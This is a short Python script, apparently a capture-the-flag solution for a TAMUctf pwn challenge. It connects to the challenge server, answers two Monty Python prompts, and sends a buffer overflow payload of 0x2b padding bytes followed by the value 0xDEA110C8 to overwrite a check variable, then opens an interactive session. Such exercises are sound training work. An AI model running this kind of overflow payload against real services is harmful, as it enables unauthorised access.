from ptrlib import *

sock = Socket("pwn.tamuctf.com", 4321)
sock.recvuntil("name?")
sock.sendline("Sir Lancelot of Camelot")
sock.recvuntil("quest?")
sock.sendline("To seek the Holy Grail.")
sock.recvuntil("secret?")
payload = b"A" * 0x2b
payload += p32(0xDEA110C8)
sock.sendline(payload)

sock.interactive()
